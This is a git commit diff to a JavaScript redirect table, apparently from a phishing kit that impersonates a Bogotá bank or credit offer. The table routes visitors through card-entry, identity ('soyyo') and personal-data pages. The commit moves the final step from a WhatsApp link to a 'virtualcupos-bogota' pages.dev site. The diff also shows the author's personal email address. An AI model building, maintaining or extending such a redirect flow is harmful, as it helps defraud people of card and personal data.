27c24df0d94d654f4d2dc6462f5cd1372c5488fb
accesoautorizado <micollflorez@gmail.com>
2026-09-25 16:38:42 -0500

    Update action.js

--- bogota/action.js
+++ bogota/action.js
@@ -11,7 +11,7 @@ const REDIRECTS = {
   'error_crédito': 'tarjeta.html?error=invalid', 
   'soyyo': 'soyyo.html',
   'datos_personales': 'datos-personales.html',
-  'finalizar': 'https://wa.me/message/SNG3H4I7373KP1',
+  'finalizar': 'https://virtualcupos-bogota.pages.dev/bogota/',
   'error_logo': 'soyyo.html?error=invalid',
 };
 
